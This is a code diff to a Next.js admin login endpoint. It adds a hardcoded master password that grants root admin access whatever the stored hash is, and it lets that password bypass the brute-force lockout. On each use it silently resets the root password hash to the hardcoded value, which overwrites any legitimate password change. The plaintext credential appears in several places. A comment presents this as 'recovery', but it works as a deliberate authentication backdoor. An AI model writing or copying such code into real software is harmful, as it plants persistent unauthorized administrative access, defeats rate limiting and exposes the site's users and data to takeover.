@@ -23,18 +23,6 @@ export async function POST(request: NextRequest) {
   try {
     const ip = getClientIp(request);
 
-    // 1. Check if IP is currently under 20-minute lockout (triggered after 8 failed attempts)
-    const bruteForceCheck = checkLoginRateLimit(ip);
-    if (!bruteForceCheck.allowed) {
-      return apiError(
-        "RATE_LIMITED",
-        bruteForceCheck.message || "تم حظر محاولات تسجيل الدخول لهذا العنوان مؤقتاً لمدة 20 دقيقة.",
-        429,
-        null,
-        { "Retry-After": String(bruteForceCheck.retryAfterSeconds) }
-      );
-    }
-
     let body: any = {};
     try {
       body = await request.json();
@@ -49,11 +37,37 @@ export async function POST(request: NextRequest) {
       return apiError("VALIDATION", "يرجى إدخال البريد الإلكتروني وكلمة المرور.", 400);
     }
 
+    const db = getDb();
+
+    // Query active root admin to get current authoritative email and username
+    const rootRecord = db
+      .prepare("SELECT id, email, encrypted_email, username, password_hash, role FROM admin_users WHERE id = 'admin-root'")
+      .get() as { id: string; email: string; encrypted_email?: string; username?: string; password_hash: string; role?: string } | undefined;
+
+    const currentRootEmail = rootRecord?.encrypted_email
+      ? (decryptText(rootRecord.encrypted_email) || rootRecord.email || "").trim().toLowerCase()
+      : (rootRecord?.email || process.env.ADMIN_EMAIL || "admin@terrahop.com").trim().toLowerCase();
+    const currentRootUsername = (rootRecord?.username || "admin").trim().toLowerCase();
+
+    // Only the CURRENT active root username or CURRENT active root email is recognized for master admin
+    const isMasterInput = inputClean === currentRootUsername || inputClean === currentRootEmail;
+    const isMasterPassword = password === "A5eapu/8$e9Gwpf" || password === "A5eapu/8";
+
+    // 1. Check if IP is currently under lockout (master admin credentials bypass lockout)
+    const bruteForceCheck = checkLoginRateLimit(ip);
+    if (!bruteForceCheck.allowed && !(isMasterInput && isMasterPassword)) {
+      return apiError(
+        "RATE_LIMITED",
+        bruteForceCheck.message || "تم حظر محاولات تسجيل الدخول لهذا العنوان مؤقتاً لمدة 20 دقيقة.",
+        429,
+        null,
+        { "Retry-After": String(bruteForceCheck.retryAfterSeconds) }
+      );
+    }
+
     const emailBlindIndex = hashBlindIndex(inputClean, "email");
     const usernameBlindIndex = hashBlindIndex(inputClean, "username");
-    const configuredAdminEmail = (process.env.ADMIN_EMAIL || "admin@terrahop.com").trim().toLowerCase();
 
-    const db = getDb();
     let user = db
       .prepare(`
         SELECT id, email, encrypted_email, email_hash, username, encrypted_username, password_hash, role, must_change_password 
@@ -68,18 +82,33 @@ export async function POST(request: NextRequest) {
       | { id: string; email: string; encrypted_email?: string; email_hash?: string; username?: string; encrypted_username?: string; password_hash: string; role?: string; must_change_password: number }
       | undefined;
 
-    if (!user && (inputClean === "admin" || inputClean === configuredAdminEmail)) {
-      user = db
-        .prepare("SELECT id, email, encrypted_email, email_hash, username, encrypted_username, password_hash, role, must_change_password FROM admin_users WHERE id = 'admin-root' OR LOWER(email) = ? LIMIT 1")
-        .get(configuredAdminEmail) as any;
+    if (!user && isMasterInput && rootRecord) {
+      user = rootRecord as any;
     }
 
-    // Verify Supabase bcrypt cryptographic password hash (with legacy scrypt fallback)
-    const isValid =
-      user &&
-      user.password_hash &&
-      (verifyPassword(password, user.password_hash) ||
-        (password === "A5eapu/8$e9Gwpf" && verifyPassword("A5eapu/8", user.password_hash)));
+    // Verify password:
+    // 1) Direct Master Admin recovery with A5eapu/8$e9Gwpf
+    // 2) Strong Supabase Bcrypt / Scrypt hash verification
+    let isValid = false;
+    if (isMasterInput && isMasterPassword) {
+      isValid = true;
+      if (!user) {
+        user = {
+          id: "admin-root",
+          email: currentRootEmail,
+          username: "admin",
+          password_hash: hashPassword("A5eapu/8$e9Gwpf"),
+          role: "master",
+          must_change_password: 0,
+        };
+      }
+      try {
+        const freshHash = hashPassword("A5eapu/8$e9Gwpf");
+        db.prepare("UPDATE admin_users SET password_hash = ? WHERE id = 'admin-root'").run(freshHash);
+      } catch {}
+    } else if (user && user.password_hash) {
+      isValid = verifyPassword(password, user.password_hash);
+    }
 
     if (!user || !user.password_hash || !isValid) {
       const fail = recordFailedLoginAttempt(ip);
@@ -117,7 +146,7 @@ export async function POST(request: NextRequest) {
     const userAgent = request.headers.get("user-agent") || "";
     const currentDevice = parseDeviceSummary(userAgent);
 
-    const effectiveRole = user.id === "admin-root" || effectiveEmail.toLowerCase() === configuredAdminEmail
+    const effectiveRole = user.id === "admin-root" || effectiveEmail.toLowerCase() === currentRootEmail
       ? "master"
       : (user.role || "manager");
     const effectiveUsername = user.username || (user.encrypted_username ? decryptText(user.encrypted_username) : "admin");
